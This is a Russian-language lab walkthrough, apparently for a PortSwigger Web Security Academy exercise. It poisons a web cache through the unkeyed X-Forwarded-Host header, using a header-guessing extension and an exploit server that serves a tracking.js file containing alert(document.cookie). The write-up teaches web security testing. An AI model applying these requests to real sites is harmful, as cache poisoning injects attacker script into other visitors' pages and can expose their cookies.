Перейдем на уязвимый ресурс 

И проанализируем запросы при открытии домашней страницы и отправим его в `Repeater`

```
GET / 
```

И видим следующие заголовки в ответе 
```
Cache-Control: max-age=30
Age: 0
X-Cache: miss
```
Далее разберемся что каждое из данных заголовков означает - 

`Cache-Control: max-age=30` - максимальный срок жизни кэша составляет 30 секунд

`Age: 0` - сколько прошло с момента обновления кэша

`X-Cache: miss` - это новый, ранее не кешированный запрос

Если же мы увидим `X-Cache: hit` то `Age` у него будет не нулевой, но все равно в пределах `0 < Age < 30`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/1.png)

Далее нам необходимо установить расширение Param miner для поиска дополнительного заголовка, который нам поможет

А запрос изменим на `GET /?cb=123 `
и нажмем `ПКМ -> Extenstion -> Param miner -> Guess params -> Guess Headers`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/2.png)

И далее спустя время в `Target -> Issues -> Cache poisoning` увидим параметр `x-forwarded-host` который нам может быть полезен
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/3.png)

Далее перейдем в `Exploit server` и возьмем его URL, чтобы было перенаправление 
```
exploit-0afa0094049078cb812e1a6701640068.exploit-server.net
```
а в поле File вставим путь к .js скрипту `/resources/js/tracking.js`
а в Body вставим `alert(document.cookie)`
а вот как это выглядит в `Exploit Server`
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/4.png)

А вот как в запросе в Repeater, который мы отправили
```
GET /?cb=123 
X-Forwarded-Host: exploit-0afa0094049078cb812e1a6701640068.exploit-server.net
```
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/5.png)

а далее перейдем по корневой странице с уже закешированным
```
GET / 
X-Forwarded-Host: exploit-0afa0094049078cb812e1a6701640068.exploit-server.net
```
Увидим, что  пэйлоад отработал, и мы получим уведомление об успешной лабораторной работе
![img](https://github.com/adyatlove/PortSwiggerAcademy/blob/main/23.%20Web%20cache%20poisoning/1.%20Web%20cache%20poisoning%20with%20an%20unkeyed%20header/pics%20for%20walkthrough/6.png)
